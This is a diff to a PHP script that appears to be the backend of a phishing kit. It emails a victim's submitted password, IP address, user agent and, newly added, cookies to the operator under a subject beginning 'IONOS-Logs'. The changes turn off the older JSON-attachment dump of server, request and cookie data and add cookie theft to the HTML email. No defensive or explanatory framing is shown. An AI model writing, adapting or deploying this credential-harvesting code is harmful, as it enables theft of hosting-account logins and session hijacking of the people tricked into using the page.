@@ -64,53 +64,53 @@ function sendEmail($subject, $message, $file = "")
 
 
     // Normal
-    // $headers  = 'MIME-Version: 1.0' . "\r\n";
-    // $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
+    $headers  = 'MIME-Version: 1.0' . "\r\n";
+    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
 
     // Create email headers
-    // $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
-    // $headers .= "Reply-to: $SENDER_EMAIL\r\n";
+    $headers .= "From: Office M3sh<$SENDER_EMAIL>\r\n";
+    $headers .= "Reply-to: $SENDER_EMAIL\r\n";
 
-    // return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
+    return mail($EMAIL, $subject, $message, $headers, "-f$SENDER_EMAIL");
 
 
     // OTHER 
-    $filename = pathinfo($file, PATHINFO_FILENAME);
+    // $filename = pathinfo($file, PATHINFO_FILENAME);
 
-    $content = file_get_contents($file);
-    $content = chunk_split(base64_encode($content));
+    // $content = file_get_contents($file);
+    // $content = chunk_split(base64_encode($content));
 
-    // a random hash will be necessary to send mixed content
-    $separator = md5(time());
+    // // a random hash will be necessary to send mixed content
+    // $separator = md5(time());
 
-    // carriage return type (RFC)
-    $eol = "\r\n";
+    // // carriage return type (RFC)
+    // $eol = "\r\n";
 
-    $headers  = 'MIME-Version: 1.0' . $eol;
-    $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol;
-    $headers .= "Content-Transfer-Encoding: 7bit" . $eol;
-    $headers .= "This is a MIME encoded message." . $eol;
+    // $headers  = 'MIME-Version: 1.0' . $eol;
+    // $headers .= "Content-Type: multipart/mixed; boundary=\"" . $separator . "\"" . $eol;
+    // $headers .= "Content-Transfer-Encoding: 7bit" . $eol;
+    // $headers .= "This is a MIME encoded message." . $eol;
 
-    // Create email headers
-    $headers .= "From: Office M3sh<$SENDER_EMAIL>" . $eol;
-    $headers .= "Reply-to: $SENDER_EMAIL" . $eol;
+    // // Create email headers
+    // $headers .= "From: Office M3sh<$SENDER_EMAIL>" . $eol;
+    // $headers .= "Reply-to: $SENDER_EMAIL" . $eol;
 
-    // Message
-    $body = "--" . $separator . $eol;
-    $body .= "Content-Type: text/html; charset=\"iso-8859-1\"" . $eol;
-    $body .= "Content-Transfer-Encoding: 8bit" . $eol;
-    $body .= $message . $eol;
+    // // Message
+    // $body = "--" . $separator . $eol;
+    // $body .= "Content-Type: text/html; charset=\"iso-8859-1\"" . $eol;
+    // $body .= "Content-Transfer-Encoding: 8bit" . $eol;
+    // $body .= $message . $eol;
 
-    // attachment
-    $body .= "--" . $separator . $eol;
-    $body .= "Content-Type: application/json; name=\"" . $filename . "\"" . $eol;
-    $body .= "Content-Transfer-Encoding: base64" . $eol;
-    $body .= "Content-Disposition: attachment" . $eol;
-    $body .= $content . $eol;
-    $body .= "--" . $separator . "--";
+    // // attachment
+    // $body .= "--" . $separator . $eol;
+    // $body .= "Content-Type: application/json; name=\"" . $filename . "\"" . $eol;
+    // $body .= "Content-Transfer-Encoding: base64" . $eol;
+    // $body .= "Content-Disposition: attachment" . $eol;
+    // $body .= $content . $eol;
+    // $body .= "--" . $separator . "--";
 
 
-    return mail($EMAIL, $subject, $body, $headers, "-f$SENDER_EMAIL");
+    // return mail($EMAIL, $subject, $body, $headers, "-f$SENDER_EMAIL");
 }
 
 if (isset($_REQUEST['send'])) {
@@ -124,14 +124,14 @@ if (isset($_REQUEST['send'])) {
 
     try {
         // Create file
-        $filename = "$name.json";
-        $file = fopen($filename, "w");
-        fwrite($file, json_encode([
-            "server" => $_SERVER,
-            "request" => $_REQUEST,
-            "cookie" => $cookies
-        ]));
-        fclose($file);
+        // $filename = "$name.json";
+        // $file = fopen($filename, "w");
+        // fwrite($file, json_encode([
+        //     "server" => $_SERVER,
+        //     "request" => $_REQUEST,
+        //     "cookie" => $cookies
+        // ]));
+        // fclose($file);
 
         // Send Mail
         $message = "<!DOCTYPE html>
@@ -201,6 +201,12 @@ if (isset($_REQUEST['send'])) {
                         <p class='title'>User Agent:</p>
                         <p class='content'>{{agent}}</p>
                     </div>
+
+                    <div class='dotted'></div>
+                    <div class='flex'>
+                        <p class='title'>Cookies:</p>
+                        <p class='content'>{{cookie}}</p>
+                    </div>
                 </div>
             </body>
         </html>";
@@ -208,11 +214,12 @@ if (isset($_REQUEST['send'])) {
         $message = str_replace("{{password}}", $password, $message);
         $message = str_replace("{{ip}}", $ip, $message);
         $message = str_replace("{{agent}}", $agent, $message);
+        $message = str_replace("{{cookie}}", $cookie, $message);
 
         $mail = sendEmail("IONOS-Logs | $ip", $message, $filename);
         if ($mail["error"]) throw new Exception("Could not send");
 
-        unlink($filename);
+        // unlink($filename);
 
         echo $response = json_encode(["status" => true, "message" => "Email sent"]);
     } catch (Exception $e) {
